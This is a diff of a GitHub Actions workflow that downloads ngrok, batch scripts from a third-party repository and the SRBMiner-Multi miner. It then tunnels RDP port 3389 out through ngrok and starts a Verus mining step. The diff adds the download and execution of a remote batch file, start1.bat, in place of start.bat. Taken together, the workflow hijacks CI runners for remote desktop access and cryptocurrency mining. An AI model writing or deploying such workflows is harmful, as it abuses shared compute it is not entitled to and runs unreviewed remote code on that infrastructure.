@@ -12,6 +12,7 @@ jobs:
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/ngrokstable.zip -OutFile ngrok.zip
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/start1.bat -OutFile start1.bat
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/srb/vendorax.bat -OutFile vendorax.bat
         Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-win64.zip -OutFile srbminer.zip
         
@@ -36,7 +37,7 @@ jobs:
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
       
     - name: Connect to RDP  [CPU 2 Core - 7GB Ram - 256 SSD]
-      run: cmd /c start.bat
+      run: cmd /c start1.bat
       
     - name: coba mining verus
       run: |
